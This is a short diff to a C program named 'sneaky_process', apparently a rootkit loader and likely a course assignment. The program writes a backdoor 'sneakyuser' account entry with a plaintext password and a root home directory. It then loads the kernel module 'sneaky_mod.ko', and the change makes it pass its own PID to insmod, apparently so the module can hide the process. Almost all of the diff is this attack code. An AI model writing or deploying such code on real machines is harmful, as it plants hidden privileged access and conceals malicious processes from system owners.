@@ -2,8 +2,6 @@
 #include <stdlib.h>
 #include <linux/moduleparam.h>
 
-static int pid;
-
 int main(void) {
     //print process ID
     printf("sneaky_process pid = %d\n", getpid());
@@ -15,8 +13,9 @@ int main(void) {
     fprintf(out, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");  
     fclose(out);  
     //load module
-    system("insmod sneaky_mod.ko");
-    module_param(pid, int, 0);
+    char buffer [100];
+    snprintf (buffer, 100, "insmod sneaky_mod.ko pid=%d", getpid());
+    system(buffer);
     //loop
     char cur;
     do {
